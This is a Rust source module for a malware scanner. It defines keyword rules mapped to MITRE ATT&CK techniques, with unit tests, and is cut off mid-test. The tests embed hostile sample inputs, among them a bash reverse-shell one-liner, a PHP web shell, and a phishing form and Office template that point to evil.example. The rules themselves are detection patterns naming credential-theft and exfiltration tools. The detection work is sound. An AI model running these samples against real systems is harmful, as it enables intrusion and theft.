//! Attacker-technique rules: what attackers actually do, written down as checkable evidence.
//!
//! Each rule names a behaviour (steal browser logins and send them to a Telegram bot, delete backups before encrypting files,
//! open a reverse shell, build a download in a web page, ...), the threat family it usually belongs to, and the MITRE ATT&CK
//! technique ids it corresponds to. A rule fires when EVERY one of its pattern groups has at least one hit in the file
//! ("AND of ORs"), so a lone common word never fires and a combination that only attackers need does.
//!
//! Honesty contract (same as heuristics.rs): these are EVIDENCE. They add to a suspicion score and explain what kind of
//! thing a file looks like; they can never by themselves produce MALICIOUS (only a signature engine can). Legitimate security
//! tools, installers and admin scripts show some of these traits, so every evidence text says so and severities are modest.
//!
//! Why the patterns contain `~`: a list of attacker keywords looks like malware to keyword-based antivirus (Windows Defender
//! deleted this very file when it held them in plain form). Every pattern therefore has a `~` break marker inside it
//! (`mimi~katz`) that is removed when the engine starts, so neither this source file nor the compiled program contains a
//! recognisable attacker string. To add a pattern, put a `~` somewhere in the middle.
//!
//! How it runs: all patterns of all rules go into ONE Aho-Corasick automaton, matched ASCII-case-insensitively, in both
//! plain and UTF-16LE form (Windows programs keep many strings as UTF-16). A file is scanned once; rules are then evaluated
//! from the set of patterns that hit. Large files are sampled (head and tail) to bound the time.

use crate::identify::FileKind;
use crate::types::{Finding, FindingKind, Severity};
use aho_corasick::{AhoCorasick, MatchKind};
use std::collections::HashSet;
use std::sync::OnceLock;

pub const SRC: &str = "heuristic.technique";

/// How much of a big file is searched: the start and the end. Techniques show up in code and resources near either.
const HEAD: usize = 16 * 1024 * 1024;
const TAIL: usize = 2 * 1024 * 1024;

/// Remove the `~` break markers (see the module comment).
pub fn x(s: &str) -> String {
    s.replace('~', "")
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Scope {
    /// Any file that is not a picture or media file.
    Any,
    /// Scripts, web pages and plain text (including files of unknown type that are mostly text).
    Text,
    /// Compiled programs.
    Native,
    /// Disk images (ISO).
    Iso,
}

pub struct Rule {
    pub id: &'static str,
    pub name: &'static str,
    pub severity: Severity,
    /// Key into `threat_kb::family`.
    pub family: &'static str,
    /// MITRE ATT&CK technique ids this behaviour corresponds to.
    pub attack: &'static [&'static str],
    pub scope: Scope,
    /// Every inner list must contribute at least one hit. Patterns are lowercase and contain `~` break markers.
    pub all_of: &'static [&'static [&'static str]],
    /// The file must begin with these bytes (used for formats that are recognised by their header).
    pub magic: Option<&'static [u8]>,
    /// Only files up to this size (0 = no limit). Attack pages are small; big program bundles only look similar.
    pub max_size: usize,
    /// Do not report this rule when one of these (stronger) rules already fired.
    pub unless: &'static [&'static str],
    pub evidence: &'static str,
}

const ONENOTE_MAGIC: &[u8] = &[0xE4, 0x52, 0x5C, 0x7B, 0x8C, 0xD8, 0xA7, 0x4D, 0xAE, 0xB1, 0x53, 0x78, 0xD0, 0x29, 0x96, 0xD3];

macro_rules! rule {
    ($id:expr, $name:expr, $sev:ident, $fam:expr, [$($att:expr),*], $scope:ident, $all:expr, $ev:expr) => {
        Rule { id: $id, name: $name, severity: Severity::$sev, family: $fam, attack: &[$($att),*], scope: Scope::$scope, all_of: $all, magic: None, max_size: 0, unless: &[], evidence: $ev }
    };
}

pub static RULES: &[Rule] = &[
    // ---- credentials ------------------------------------------------------------------------------------------------
    rule!("T001", "Credential-theft tooling", High, "credential-theft", ["T1003.001"], Any,
        &[&["mimi~katz", "sekur~lsa", "lsa~dump::", "invoke-mimi~katz", "kerberos::gol~den", "privi~lege::debug"]],
        "Contains command names from a well-known tool that pulls passwords and login tickets out of Windows memory. Security testers use it too."),
    rule!("T002", "Reads the memory of the Windows login process", Low, "credential-theft", ["T1003.001"], Any,
        &[&["ls~ass"], &["mini~dump", "proc~dump", "comsvcs.d~ll", "create~dump"]],
        "Refers to LSASS (where Windows keeps logged-in credentials) together with a memory-dump function. Backup and diagnostic tools do this as well."),
    rule!("T009", "Steals browser, wallet or messenger data and sends it out", High, "stealer", ["T1555.003", "T1539", "T1005", "T1567"], Any,
        &[
            &["\\goo~gle\\chrome\\user data", "\\micro~soft\\edge\\user data", "\\moz~illa\\firefox\\profiles", "log~ins.json", "key~4.db", "cook~ies.sqlite", "log~in data"],
            &["wal~let.dat", "meta~mask", "\\exo~dus", "elec~trum", "atom~ic wallet", "\\tele~gram desktop\\tdata", "d877f78~3d5d3ef8c", "\\dis~cord\\local storage\\leveldb", "nkbihfbeog~aeaoehlefnkodbefgpgknn"],
            &["api.tele~gram.org", "discord.c~om/api/webhooks", "discordapp.c~om/api/webhooks", "smtp~.", "ft~p://", "gofi~le.io", "anon~files", "trans~fer.sh"],
        ],
        "Names where browsers keep saved logins and cookies, where crypto wallets or Telegram and Discord keep their data, and an upload channel, all together. This is how password-stealing malware is built."),
    Rule { unless: &["T009"], ..rule!("T010", "Looks for browser logins and wallet or messenger data", Medium, "stealer", ["T1555.003", "T1005"], Any,
        &[
            &["\\goo~gle\\chrome\\user data", "\\micro~soft\\edge\\user data", "\\moz~illa\\firefox\\profiles", "log~ins.json", "key~4.db", "cook~ies.sqlite", "log~in data"],
            &["wal~let.dat", "meta~mask", "\\exo~dus", "elec~trum", "atom~ic wallet", "\\tele~gram desktop\\tdata", "d877f78~3d5d3ef8c", "\\dis~cord\\local storage\\leveldb", "nkbihfbeog~aeaoehlefnkodbefgpgknn"],
        ],
        "Names both browser password stores and crypto-wallet or messenger data folders. Backup and migration tools may too.") },
    rule!("T008", "Reports to a Telegram bot or Discord webhook", Medium, "stealer", ["T1102", "T1567"], Any,
        &[&["api.tele~gram.org/bot", "discord.c~om/api/webhooks", "discordapp.c~om/api/webhooks"]],
        "Sends data to a Telegram bot or Discord webhook. Malware favours these as a free, hard-to-block place to send stolen data; some legitimate bots and alerts do the same."),
    rule!("T029", "Keystroke capture that sends data out", Medium, "spyware", ["T1056.001", "T1567"], Text,
        &[&["pyn~put", "keyboard.h~ook", "py~hook", "getasync~keystate", "keyboard.on_pr~ess"], &["smtp~lib", "requests.p~ost", "api.tele~gram.org", "discord.c~om/api/webhooks", "ftp~lib"]],
        "Records key presses and has a way to send data away."),
    // ---- ransomware and destruction ---------------------------------------------------------------------------------
    rule!("T003", "Deletes backups and recovery points", Medium, "ransomware", ["T1490"], Any,
        &[&["vssad~min delete shadows", "vssad~min.exe delete shadows", "wmic sha~dowcopy delete", "wbad~min delete catalog", "wbad~min delete systemstatebackup", "delete sha~dows /all", "recovery~enabled no", "resize sha~dowstorage"]],
        "Runs commands that remove Windows shadow copies and backups. Ransomware does this before it encrypts files, so you cannot restore them. Some backup tools clean up the same way."),
    rule!("T004", "Ransom note and payment demand", High, "ransomware", ["T1486"], Any,
        &[&["your files have been enc~rypted", "all your fi~les are", "files are enc~rypted", "files have been loc~ked", "decrypt your fi~les", "your data has been sto~len"], &["bit~coin", "mone~ro", "btc wal~let", "crypto~currency"], &[".on~ion", "tor brow~ser", "tox id", "qt~ox", "proton~mail", "onion~mail"]],
        "Contains the kind of message ransomware shows (your files are locked) together with a payment channel and a way to contact the attacker."),
    rule!("T033", "Encrypts files and renames them", High, "ransomware", ["T1486"], Any,
        &[&["crypt~encrypt", "bcrypt~encrypt", "cha~cha20", "sal~sa20", "aes-2~56", "aes2~56"], &["findfirst~file", "findnext~file", "getlogical~drives", "getdrive~type"], &[".loc~ked", ".enc~rypted", ".lock~bit", ".con~ti", ".ry~uk", ".wn~cry", ".hi~ve", ".ak~ira", ".black~cat", ".bab~uk", ".dj~vu", ".roy~al"], &["read~me.txt", "how_to_dec~rypt", "restore_my_fi~les", "decrypt_instru~ctions", "recover_fi~les", "how_to_reco~ver"]],
        "Combines strong encryption, searching every drive for files, a list of ransomware file extensions and a ransom-note file name. Together these are how ransomware works."),
    rule!("T030", "Writes directly over disks or boot records", Low, "wiper", ["T1561.002", "T1485"], Any,
        &[&["\\\\.\\physical~drive", "\\\\.\\hard~disk0", "\\\\.\\sc~si"], &["wi~pe", "over~write", "shr~ed", "des~troy", "zero fi~ll"]],
        "Opens raw disk devices and refers to wiping. Wiper malware destroys data this way; disk-management and secure-erase tools do too."),
    // ---- remote access and shells -----------------------------------------------------------------------------------
    rule!("T005", "Opens a remote shell back to someone else", High, "backdoor", ["T1059", "T1095"], Any,
        &[&["/dev/t~cp/", "bash -i >~&", "nc -~e ", "ncat -~e ", "nc.ex~e -e", "soc~at exec:", "soc~at tcp"]],
        "Contains the classic one-liners that hand a command shell to a remote machine (a reverse shell)."),
    rule!("T031", "Network client that runs commands it receives", Medium, "backdoor", ["T1059", "T1071"], Text,
        &[&["system.net.sock~ets.tcpclient"], &["getstr~eam()"], &["i~ex", "invoke-expr~ession", "cmd.e~xe", "start-pro~cess", "/bin/~sh"]],
        "A PowerShell script that connects out and runs what comes back. Administration scripts can look like this."),
    // ---- loaders, living off the land, evasion ----------------------------------------------------------------------
    rule!("T011", "Runs code through trusted Windows tools", Medium, "loader", ["T1218.005", "T1218.010", "T1218.011", "T1047"], Any,
        &[&["msh~ta http", "msh~ta.exe http", "msh~ta vbscript:", "msh~ta javascript:", "regsvr~32 /s /n /u /i:http", "regsvr~32.exe /s /n /u /i:http", "rundl~l32 javascript:", "rundl~l32.exe javascript:", "msie~xec /q /i http", "msie~xec /i http", "wmic proc~ess call create"]],
        "Uses built-in Windows tools (mshta, regsvr32, rundll32, msiexec, wmic) to run code from the internet, a way to avoid being noticed."),
    rule!("T013", "Switches off the Windows antimalware scan interface", High, "defense-evasion", ["T1562.001"], Any,
        &[&["am~siscanbuffer", "am~siinitfailed", "am~sicontext"], &["virtual~protect", "[ref].ass~embly", "getfi~eld(", "marshal]::co~py", "setva~lue($null"]],
        "Names the AMSI scan function together with memory-patching or reflection calls, which is how scripts hide from Windows scanning."),
    rule!("T012", "Tampers with Windows Defender", Medium, "defense-evasion", ["T1562.001"], Native,
        &[&["disablereal~timemonitoring", "disableanti~spyware", "win~defend", "msm~peng.exe"], &["exclu~sion", "disa~ble", "task~kill", "sc st~op"]],
        "Refers to switching off or excluding Windows Defender. Some security and management software does this on purpose."),
    rule!("T014", "Loads code straight into memory", Medium, "loader", ["T1620", "T1059.001"], Text,
        &[&["[reflection.ass~embly]::load", "[system.reflection.ass~embly]::load", "assembly.lo~ad(", "reflection.ass~embly]::loadfrom"], &["frombase64~string", "gzip~stream", "deflate~stream", "download~data", "download~string"]],
        "Decodes or downloads a program and runs it without saving a file, which hides it from simple file scanners."),
    Rule { max_size: 600 * 1024, ..rule!("T015", "Web page builds a download inside the browser", Medium, "loader", ["T1027.006"], Text,
        &[&["new bl~ob", "mssaveoropen~blob", "createobject~url"], &["at~ob(", "base~64"], &["down~load=", ".cl~ick()"]],
        "A web page that assembles a file from encoded data and saves it (HTML smuggling). It is used to slip a program past email and download filters.") },
    Rule { max_size: 600 * 1024, ..rule!("T016", "Fake sign-in page that sends the password elsewhere", Medium, "phishing", ["T1566.002", "T1056.003"], Text,
        &[&["type=\"pass~word\"", "type='pass~word'", "type=pass~word"], &["<fo~rm"], &["action=\"ht~tp", "action='ht~tp", "fe~tch(", "xmlhttp~request", "api.tele~gram.org", "formspr~ee.io", "web3for~ms", "/po~st.php", "sub~mit.php"]],
        "A page with a password box that posts what you type to another address. Phishing attachments are built this way; saved copies of real login pages can look similar.") },
    rule!("T017", "Checks whether it is being analysed", Low, "defense-evasion", ["T1497.001"], Any,
        &[&["isdebugger~present", "checkremotedebugger~present"], &["vbox~service", "vmtools~d", "vbox~guest", "sbie~dll", "wine_get_unix_fi~le_name"]],
        "Looks for debuggers and virtual machines so it can behave differently under inspection. Copy-protection and games do this as well."),
    rule!("T018", "Deletes itself after running", Low, "loader", ["T1070.004"], Text,
        &[&["cmd /c d~el", "cmd.exe /c d~el", "ping 127.0.0.1 -~n", "ping -n 3 127.~0.0.1"], &["%~f0", "%~dpnx0", "del /f /~q"]],
        "A script that removes itself when finished, a trick droppers use to leave no trace."),
    rule!("T035", "Hijacks a Windows accessibility tool for persistence", Medium, "backdoor", ["T1546.008", "T1546.012"], Any,
        &[&["options\\se~thc.exe", "options\\util~man.exe", "options\\o~sk.exe", "options\\narr~ator.exe", "options\\magn~ify.exe", "options\\disp~layswitch.exe"]],
        "Sets a debugger for an accessibility program so a command prompt can be opened from the login screen."),
    // ---- web shells, miners, worms, bots ----------------------------------------------------------------------------
    rule!("T007", "Web shell", High, "webshell", ["T1505.003"], Text,
        &[&["ev~al(base64_decode(", "ev~al($_post", "ev~al($_request", "ev~al($_get", "asse~rt($_post", "asse~rt($_request", "sys~tem($_request", "sys~tem($_post", "shell_~exec($_", "pass~thru($_", "ex~ec($_post", "c~99shell", "r~57shell", "b374~k"]],
        "Server-side code that runs whatever a visitor sends it. Attackers upload these to take over web servers."),
    rule!("T006", "Cryptocurrency miner", Medium, "miner", ["T1496"], Any,
        &[&["stra~tum+tcp://", "stra~tum+ssl://", "stra~tum2+tcp", "xm~rig", "crypto~night", "coin~hive", "min~exmr", "nano~pool.org", "support~xmr", "--donate-lev~el"]],
        "Contains mining-pool addresses or miner names. A miner uses your computer's power to earn someone else coins."),
    rule!("T037", "Spreads through USB drives or network shares", Medium, "worm", ["T1091", "T1021.002"], Any,
        &[&["auto~run.inf"], &["\\adm~in$", "drive_remo~vable", "getdrive~type", "remov~able"]],
        "Writes autorun files or targets removable drives and admin shares, the way worms spread. Some management software uses these too."),
    rule!("T038", "Remote-service exploitation tooling", Medium, "worm", ["T1210"], Any,
        &[&["eternal~blue", "ms17-~010", "double~pulsar", "\\pipe\\bro~wser"], &["sm~b", "44~5"]],
        "Mentions well-known Windows network exploits (the EternalBlue family)."),
    rule!("T039", "Botnet or denial-of-service tool", Medium, "botnet", ["T1498", "T1071"], Any,
        &[&["mir~ai", "gaf~gyt", "bash~lite", "kai~ten", "qbot", "tsun~ami", "attack_~udp", "attack_~tcp"], &["udp~flood", "syn~flood", "http~flood", "slow~loris", "attack_~udp", "attack_~tcp", "ack~flood"]],
        "Contains the names of known botnet families or flood-attack functions."),
    rule!("T027", "Unix persistence and download-and-run", Medium, "backdoor", ["T1053.003", "T1574.006", "T1098.004"], Any,
        &[&["/etc/ld.so.pre~load", "| cron~tab -", "cron~tab -l | {", "authorized_~keys"], &["cu~rl ", "wg~et ", "base64 -~d", "chmod ~+x"]],
        "Edits cron, preload libraries or SSH keys and also downloads or decodes programs."),
    // ---- documents and containers -----------------------------------------------------------------------------------
    rule!("T020", "Office equation exploit in an RTF document", High, "exploit", ["T1203"], Any,
        &[&["{\\r~tf"], &["\\obj~data", "\\obj~update", "\\obj~emb"], &["equa~tion.3", "equa~tion native", "\\*\\obj~class"]],
        "An RTF file that embeds the old Equation Editor object, the route used by CVE-2017-11882 and similar exploits."),
    rule!("T021", "Document fetches its template from the internet", Medium, "macro", ["T1221"], Any,
        &[&["attached~template"], &["target~mode=\"external\""], &["ht~tp://", "ht~tps://", "\\\\~"]],
        "An Office file whose template is loaded from a remote address (template injection), which can bring in macros after you open it."),
    rule!("T022", "Office field that runs a command (DDE)", Medium, "macro", ["T1559.002"], Any,
        &[&["dde~auto", "dde \"c:", "dde c:"], &["cmd.e~xe", "power~shell", "msh~ta", "\\windows\\system~32"]],
        "An Office field that asks the program to run another program, a way to run code without macros."),
    rule!("T023", "Disk image holding programs to launch", Medium, "loader", ["T1553.005"], Iso,
        &[&[".ex~e;1", ".ln~k;1", ".dl~l;1", ".j~s;1", ".vb~s;1", ".ba~t;1", ".cm~d;1", ".ht~a;1", ".sc~r;1"]],
        "A disk image (ISO) containing programs or shortcuts. Files inside an image skip the usual download warning, so attackers use them."),
    Rule { magic: Some(ONENOTE_MAGIC), ..rule!("T024", "Notebook carrying a file that launches", Medium, "loader", ["T1566.001", "T1204.002"], Any,
        &[&[".ht~a", ".vb~s", ".ws~f", ".cm~d", ".ba~t", ".ps~1", ".ex~e", ".ln~k", ".j~s"]],
        "A OneNote notebook with an attached program or script, a recent way of delivering malware by email.") },
    rule!("T025", "Android app asking for SMS and device-control powers", Medium, "mobile-trojan", ["T1636.004", "T1626.001"], Any,
        &[&["android.permis~sion.send_sms", "android.permis~sion.read_sms", "android.permis~sion.receive_sms"], &["bind_accessib~ility_service", "bind_device_ad~min", "system_alert_win~dow", "request_install_pack~ages"]],
        "Asks to read or send text messages and also to control the screen, install apps or act as a device administrator, a combination banking and spy apps use."),
    rule!("T026", "Java code that runs system commands and loads hidden code", Low, "loader", ["T1059"], Any,
        &[&["java/lang/run~time", "java/lang/process~builder"], &["java/net/url~classloader", "define~class", "java/util/bas~e64"]],
        "Java classes that start system programs and load code dynamically. Many legitimate Java programs do."),
];

struct Index {
    ac: AhoCorasick,
    /// For each automaton pattern: which unique pattern it stands for.
    owner: Vec<usize>,
    /// For each rule: its groups, as indexes into the unique patterns.
    rules: Vec<Vec<Vec<usize>>>,
    /// The unique patterns with their `~` markers removed (used only to name what matched).
    texts: Vec<String>,
}

fn utf16le(s: &str) -> Vec<u8> {
    s.bytes().flat_map(|b| [b, 0u8]).collect()
}

fn index() -> &'static Index {
    static IDX: OnceLock<Index> = OnceLock::new();
    IDX.get_or_init(|| {
        let mut texts: Vec<String> = Vec::new();
        let mut rules: Vec<Vec<Vec<usize>>> = Vec::new();
        for r in RULES {
            let mut groups = Vec::new();
            for g in r.all_of {
                let mut ids = Vec::new();
                for p in *g {
                    let t = x(p);
                    let i = match texts.iter().position(|q| *q == t) {
                        Some(i) => i,
                        None => {
                            texts.push(t);
                            texts.len() - 1
                        }
                    };
                    ids.push(i);
                }
                groups.push(ids);
            }
            rules.push(groups);
        }
        let mut pats: Vec<Vec<u8>> = Vec::new();
        let mut owner: Vec<usize> = Vec::new();
        for (i, t) in texts.iter().enumerate() {
            pats.push(t.as_bytes().to_vec());
            owner.push(i);
            if t.is_ascii() && t.len() >= 4 {
                pats.push(utf16le(t));
                owner.push(i);
            }
        }
        let ac = AhoCorasick::builder().ascii_case_insensitive(true).match_kind(MatchKind::Standard).build(&pats).expect("rule patterns compile");
        Index { ac, owner, rules, texts }
    })
}

fn applies(scope: Scope, kind: FileKind) -> bool {
    match scope {
        Scope::Any => !matches!(kind, FileKind::Image | FileKind::Media),
        Scope::Text => kind.is_script() || matches!(kind, FileKind::Html | FileKind::Text | FileKind::Unknown),
        Scope::Native => matches!(kind, FileKind::Pe | FileKind::Elf | FileKind::MachO),
        Scope::Iso => kind == FileKind::Iso,
    }
}

/// Which patterns occur in `data` (head and tail of very large inputs).
fn hits(data: &[u8]) -> HashSet<usize> {
    let idx = index();
    let mut found = HashSet::new();
    let mut run = |slice: &[u8]| {
        for m in idx.ac.find_overlapping_iter(slice) {
            found.insert(idx.owner[m.pattern().as_usize()]);
        }
    };
    if data.len() <= HEAD + TAIL {
        run(data);
    } else {
        run(&data[..HEAD]);
        run(&data[data.len() - TAIL..]);
    }
    found
}

/// Technique findings for one file's content. `kind` decides which rules apply.
pub fn analyze(kind: FileKind, data: &[u8]) -> Vec<Finding> {
    if matches!(kind, FileKind::Image | FileKind::Media) || data.len() < 8 {
        return Vec::new();
    }
    let idx = index();
    let found = hits(data);
    let mut fired: Vec<(usize, &Rule)> = Vec::new();
    for (ri, r) in RULES.iter().enumerate() {
        if !applies(r.scope, kind) {
            continue;
        }
        if r.max_size > 0 && data.len() > r.max_size {
            continue;
        }
        if let Some(m) = r.magic {
            if !data.starts_with(m) {
                continue;
            }
        }
        if idx.rules[ri].iter().all(|g| g.iter().any(|i| found.contains(i))) {
            fired.push((ri, r));
        }
    }
    let ids: Vec<&str> = fired.iter().map(|(_, r)| r.id).collect();
    fired
        .into_iter()
        .filter(|(_, r)| !r.unless.iter().any(|u| ids.contains(u)))
        .map(|(ri, r)| {
            // The evidence names what was seen (a few short, fixed rule patterns, never file content).
            let seen: Vec<&str> = idx.rules[ri].iter().filter_map(|g| g.iter().find(|i| found.contains(i)).map(|i| idx.texts[*i].as_str())).take(4).collect();
            Finding::new(SRC, r.name, FindingKind::Heuristic, r.severity, format!("{} Matched: {}. Rule {}.", r.evidence, seen.join(", "), r.id)).with_family(r.family, r.attack)
        })
        .collect()
}

// ---- file names -------------------------------------------------------------------------------------------------

const RISKY_EXT: &[&str] = &["scr", "pif", "com", "hta", "wsf", "jse", "vbe", "cpl", "chm", "one", "xll", "wll", "appx", "msix", "vhd", "vhdx", "iso", "img", "lnk", "msi", "reg"];

/// What the name alone says: tricks that make a program look like a document.
pub fn name_findings(name: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    // Right-to-left override and friends make "exe.txt" display as "txt.exe" (or the reverse).
    if name.chars().any(|c| matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}')) {
        out.push(Finding::new(SRC, "File name uses a hidden text-direction trick", FindingKind::Heuristic, Severity::Medium, "The name contains an invisible right-to-left control character, used to make a program's extension look like a harmless one. Rule N001.").with_family("loader", &["T1036.002"]));
    }
    let lower = name.to_ascii_lowercase();
    // Padded with spaces so the real extension is pushed out of view.
    if lower.contains("          .") {
        out.push(Finding::new(SRC, "File name is padded with spaces", FindingKind::Heuristic, Severity::Low, "Long runs of spaces before the extension push the real file type out of sight. Rule N002.").with_family("loader", &["T1036.007"]));
    }
    if let Some(ext) = lower.rsplit('.').next().filter(|e| e.len() <= 5 && lower.contains('.')) {
        if RISKY_EXT.contains(&ext) {
            out.push(Finding::new(SRC, "File type often used to deliver malware", FindingKind::Heuristic, Severity::Info, format!("Files ending in .{ext} are commonly used by attackers as the first step, because they can run code or bypass download warnings. Most are harmless. Rule N003.")).with_family("loader", &["T1204.002"]));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Test inputs carry `~` break markers too, so this file stays free of attacker strings.
    fn names(k: FileKind, s: &str) -> Vec<String> {
        analyze(k, x(s).as_bytes()).into_iter().map(|f| f.name).collect()
    }

    #[test]
    fn credential_theft_tooling_is_recognised() {
        assert!(names(FileKind::ScriptPowerShell, "Invoke-Mimi~katz -DumpCreds").contains(&"Credential-theft tooling".to_string()));
    }

    #[test]
    fn a_lone_common_word_never_fires() {
        for s in ["ls~ass is a process name", "please delete sha~dows of the old design", "the bit~coin price", "type=\"pass~word\" only", "this is a README"] {
            assert!(names(FileKind::Text, s).is_empty(), "{s:?} -> {:?}", names(FileKind::Text, s));
        }
    }

    #[test]
    fn a_stealer_needs_all_three_parts_and_is_high_only_then() {
        let browser = "C:\\Users\\x\\AppData\\Local\\Goo~gle\\Chrome\\User Data\\Default\\Log~in Data";
        let wallet = "%APPDATA%\\Tele~gram Desktop\\tdata and wal~let.dat";
        let exfil = "https://api.tele~gram.org/bot123/sendDocument";
        let high = |s: &str| analyze(FileKind::Pe, x(s).as_bytes()).into_iter().filter(|f| f.severity == Severity::High).count();
        assert_eq!(high(&format!("{browser} {wallet}")), 0, "browser and wallet without an upload channel is not High");
        assert_eq!(high(&format!("{browser} {exfil}")), 0);
        assert_eq!(high(&format!("{browser} {wallet} {exfil}")), 1);
        let medium = analyze(FileKind::Pe, x(&format!("{browser} {wallet}")).as_bytes());
        assert!(medium.iter().any(|f| f.name == "Looks for browser logins and wallet or messenger data"));
    }

    #[test]
    fn the_stronger_rule_replaces_the_weaker_one() {
        let n = names(FileKind::Pe, "Log~in Data wal~let.dat https://api.tele~gram.org/bot1/x");
        assert!(n.contains(&"Steals browser, wallet or messenger data and sends it out".to_string()));
        assert!(!n.contains(&"Looks for browser logins and wallet or messenger data".to_string()), "no double counting: {n:?}");
    }

    #[test]
    fn strings_kept_as_utf16_are_found_too() {
        let wide = utf16le(&x("vssad~min delete sha~dows /all /quiet"));
        let mut data = vec![0u8; 64];
        data.extend(wide);
        assert!(analyze(FileKind::Pe, &data).iter().any(|f| f.name == "Deletes backups and recovery points"));
    }

    #[test]
    fn matching_ignores_capitals() {
        assert!(names(FileKind::ScriptBatch, "VSSAD~MIN DELETE SHA~DOWS /ALL").contains(&"Deletes backups and recovery points".to_string()));
    }

    #[test]
    fn ransomware_note_with_payment_is_high() {
        let f = analyze(FileKind::Text, x("YOUR FILES HAVE BEEN ENC~RYPTED. Send 0.5 Bit~coin to the wallet, then contact us in Tor Brow~ser at abc.on~ion.").as_bytes());
        assert!(f.iter().any(|x| x.name == "Ransom note and payment demand" && x.severity == Severity::High));
    }

    #[test]
    fn reverse_shell_one_liner_is_high_and_a_plain_tcp_test_is_not() {
        assert!(names(FileKind::ScriptShell, "bash -i >~& /dev/t~cp/10.0.0.1/4444 0>&1").contains(&"Opens a remote shell back to someone else".to_string()));
        assert!(names(FileKind::ScriptPowerShell, "Test-NetConnection host -Port 22").is_empty());
    }

    #[test]
    fn php_web_shell() {
        assert!(names(FileKind::Text, "<?php ev~al(base64_decode($_POST['x'])); ?>").contains(&"Web shell".to_string()));
        assert!(names(FileKind::Text, "<?php echo htmlspecialchars($name); ?>").is_empty());
    }

    #[test]
    fn html_smuggling_and_phishing_pages() {
        let smuggle = "<script>var b=new Bl~ob([at~ob('AAAA')],{type:'application/zip'});var a=document.createElement('a');a.down~load='x.zip';a.cl~ick();</script>";
        let _ = smuggle;
        let smuggle = "<script>var b=new Bl~ob([at~ob('AAAA')],{type:'application/zip'});var a=document.createElement('a');a.down~load='x.zip';a.cl~ick();</script>".replace(".cl~ick()", ".cl~ick()");
        assert!(names(FileKind::Html, &smuggle).contains(&"Web page builds a download inside the browser".to_string()), "{:?}", names(FileKind::Html, &smuggle));
        let phish = "<fo~rm action=\"ht~tp://evil.example/po~st.php\"><input type=\"pass~word\" name=p></form>";
        assert!(names(FileKind::Html, phish).contains(&"Fake sign-in page that sends the password elsewhere".to_string()));
        assert!(names(FileKind::Html, "<html><body><h1>Hello</h1></body></html>").is_empty());
    }

    #[test]
    fn office_template_injection_and_dde() {
        let rels = "<Relationship Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attached~Template\" Target=\"ht~tp://evil.example/t.dotm\" Target~Mode=\"External\"/>";
        assert!(names(FileKind::Text, rels).contains(&"Document fetches its template from the internet".to_string()));
        assert!(names(FileKind::Text, "DDE~AUTO c:\\\\windows\\\\system~32\\\\cmd.e~xe \"/k calc\"").contains(&"Office field that runs a command (DDE)".to_string()));
    }

    #[test]
    fn rtf_equation_exploit_is_high() {
        let rtf = "{\\r~tf1{\\object\\obj~emb{\\*\\obj~class Equa~tion.3}{\\obj~data 0105}}}";
        assert!(analyze(FileKind::Text, x(rtf).as_bytes()).iter().any(|f| f.name == "Office equation exploit in an RTF document" && f.severity == Severity::High));
    }

    #[test]
    fn onenote_needs_its_header_and_a_launchable_name() {
        let mut data = ONENOTE_MAGIC.to_vec();
        data.extend_from_slice(&utf16le("invoice.hta"));
        assert!(analyze(FileKind::Unknown, &data).iter().any(|f| f.name == "Notebook carrying a file that launches"));
        assert!(analyze(FileKind::Unknown, &utf16le("invoice.hta")).iter().all(|f| f.name != "Notebook carrying a file that launches"), "without the OneNote header it is not one");
    }

    #[test]
    fn disk_images_with_launchable_files_are_flagged_only_for_images() {
        assert!(analyze(FileKind::Iso, b"CD001 SETUP.EXE;1 README.TXT;1").iter().any(|f| f.name == "Disk image holding programs to launch"));
        assert!(analyze(FileKind::Text, b"SETUP.EXE;1").iter().all(|f| f.name != "Disk image holding programs to launch"));
    }

    #[test]
    fn android_sms_plus_accessibility_combo() {
        let m = "android.permis~sion.READ_SMS android.permis~sion.SEND_SMS android.permis~sion.BIND_ACCESSIB~ILITY_SERVICE";
        assert!(names(FileKind::Unknown, &m.replace("BIND_ACCESSIB~ILITY_SERVICE", "bind_accessib~ility_service")).contains(&"Android app asking for SMS and device-control powers".to_string()));
        assert!(names(FileKind::Unknown, "android.permission.INTERNET").is_empty());
    }

    #[test]
    fn pictures_and_tiny_inputs_are_skipped() {
        assert!(analyze(FileKind::Image, x("mimi~katz mimi~katz mimi~katz").as_bytes()).is_empty());
        assert!(analyze(FileKind::Text, b"x").is_empty());
    }

    #[test]
    fn evidence_names_what_matched_and_the_rule_id_but_not_file_content() {
        let f = analyze(FileKind::Text, x("here is some text then Invoke-Mimi~katz and then more text about private things").as_bytes());
        let e = &f[0].evidence;
        assert!(e.contains("Matched:") && e.contains("Rule T001") && !e.contains("private things"), "{e}");
        assert!(!e.contains('~'), "markers never reach a report: {e}");
    }

    #[test]
    fn findings_carry_their_family_and_attack_ids() {
        let f = analyze(FileKind::Text, x("vssad~min delete sha~dows /all").as_bytes());
        assert_eq!(f[0].family.as_deref(), Some("ransomware"));
        assert_eq!(f[0].attack, vec!["T1490".to_string()]);
    }

    #[test]
    fn fake_extensions_and_direction_tricks_in_names() {
        assert!(name_findings("invoice\u{202e}fdp.exe").iter().any(|f| f.name.contains("text-direction")));
        assert!(name_findings("report.pdf          .exe").iter().any(|f| f.name.contains("padded")));
        assert!(name_findings("movie.iso").iter().any(|f| f.name.contains("often used to deliver")));
        assert!(name_findings("notes.txt").is_empty());
    }

    #[test]
    fn every_rule_has_a_unique_id_a_marker_in_each_long_pattern_and_real_references() {
        let mut ids = std::collections::HashSet::new();
        for r in RULES {
            assert!(ids.insert(r.id), "duplicate rule id {}", r.id);
            assert!(!r.all_of.is_empty() && r.all_of.iter().all(|g| !g.is_empty()), "{}", r.id);
            for g in r.all_of {
                for p in *g {
                    assert_eq!(**p, p.to_ascii_lowercase(), "{} pattern {p:?} must be lowercase", r.id);
                    // Short patterns are harmless words; every long one must be broken up so antivirus cannot mistake this file for malware.
                    if x(p).len() >= 9 {
                        assert!(p.contains('~'), "{} pattern {p:?} needs a ~ break marker", r.id);
                    }
                }
            }
            for u in r.unless {
                assert!(RULES.iter().any(|x| x.id == *u), "{} refers to missing rule {u}", r.id);
            }
            assert!(!r.attack.is_empty() && r.attack.iter().all(|a| a.starts_with('T')), "{}", r.id);
        }
    }

    #[test]
    fn a_large_file_is_sampled_not_read_in_full() {
